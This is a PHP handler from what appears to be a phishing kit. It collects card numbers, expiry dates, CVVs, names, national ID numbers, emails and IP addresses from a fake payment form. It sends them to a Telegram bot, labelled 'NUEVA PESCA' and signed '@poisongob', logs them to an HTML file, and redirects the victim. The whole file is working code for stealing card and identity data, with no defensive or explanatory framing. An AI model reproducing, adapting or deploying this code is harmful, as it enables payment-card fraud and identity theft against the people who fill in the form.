<?php
include '../config.php';
include './tg.php';
date_default_timezone_set($timezone);
$ip = $_SERVER['REMOTE_ADDR']; 

if (isset($_POST['EmisorElegido'])) {

  $msg  = "━━━━━━━ቿ 𝐍𝐔𝐄𝐕𝐀 𝐏𝐄𝐒𝐂𝐀 ቿ━━━━━━━\r\n";
  $msg .= " ⫸ 𝑻𝒀𝑷𝑬 : <code>{$_POST['EmisorElegido']}</code>\r\n";
  $msg .= " ⫸ 𝐂𝐚𝐫𝐝 : <code>{$_POST['card']}</code>\r\n";
  $msg .= " ⫸ 𝑴𝑶𝑵𝑻𝑯 : <code>{$_POST['ExpiryMonth']}</code>\r\n";
  $msg .= " ⫸ 𝑬𝑿𝑷 : <code>{$_POST['ExpiryYear']}</code>\r\n";
  $msg .= " ⫸ 𝑪𝑽𝑽 : <code>{$_POST['cardCvv']}</code>\r\n";
  $msg .= " ⫸ 𝐍𝐨𝐦𝐛𝐫𝐞 : <code>{$_POST['names']}</code>\r\n";
  $msg .= " ⫸ 𝑫𝑵𝑰 : <code>{$_POST['dni']}</code>\r\n";
  $msg .= " ⫸ 𝑪𝑶𝑹𝑹𝑬𝑶 : <code>{$_POST['email']}</code>\r\n";
  $msg .= "━━━━━━━ቿ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎𝐍 ቿ━━━━━━━\r\n";
  $msg .= "🌐 𝑹𝑨𝑺𝑻𝑹𝑬𝑨𝑫𝑶 : <code>".$ip."</code>\r\n";
  $msg .= "━━━━━━━ቿ @poisongob ቿ━━━━━━━\r\n\r\n\r\n";
  if ($txt == true){
    $f = fopen("./../$txtn.html", "a"); 
    fwrite ($f, '
    <div style="font-family:arial">
    '.$title.'<br>
    type: [<b><font color="#390FF1">'.$_POST['EmisorElegido'].'</font></b>]<br> 
    cc: [<b><font color="#390FF1">'.$_POST['card'].'</font></b>]<br>
    month: [<b><font color="#390FF1">'.$_POST['ExpiryMonth'].'</font></b>]<br>
    year: [<b><font color="#390FF1">'.$_POST['ExpiryYear'].'</font></b>]<br>
    cvv: [<b><font color="#390FF1">'.$_POST['cardCvv'].'</font></b>]<br>
    names: [<b><font color="#390FF1">'.$_POST['names'].'</font></b>]<br>
    dni: [<b><font color="#390FF1">'.$_POST['dni'].'</font></b>]<br>
    email: [<b><font color="#390FF1">'.$_POST['email'].'</font></b>]<br>
    IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>
    '.date("d/m/Y H:i").'<br>
    --------------------
    </div>');
    fclose($f);
  }
  if($tg == true){
  sendTg($msg, $key, $id);
  }
  header("location: $out");
}
?>